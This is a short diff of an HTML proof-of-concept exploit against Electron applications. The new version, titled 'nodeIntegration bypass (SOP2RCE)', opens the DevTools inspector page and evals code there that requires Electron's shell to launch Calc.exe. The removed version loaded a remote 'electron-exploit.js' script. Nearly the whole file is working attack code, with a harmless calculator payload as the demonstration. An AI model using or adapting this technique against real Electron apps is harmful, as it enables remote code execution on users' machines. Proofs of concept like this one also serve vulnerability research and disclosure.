@@ -1,8 +1,15 @@
+<!DOCTYPE html>
 <html>
-<head>
-<title>Simple XSS PoC</title>
-  <script src=https://seidzi-dev.github.io/electron-exploit.js></script>
-</head>
-<body>
-</body>
+  <head>
+    <title>nodeIntegration bypass (SOP2RCE)</title>
+  </head>
+  <body>
+  	<script>
+    	document.write("Current location:" + window.location.href + "<br>");
+
+    	const win = window.open("chrome-devtools://devtools/bundled/inspector.html");
+    	win.eval("const {shell} = require('electron'); 
+    	shell.openExternal('file://C:/Windows/System32/Calc.exe');");
+       </script>
+  </body>
 </html>
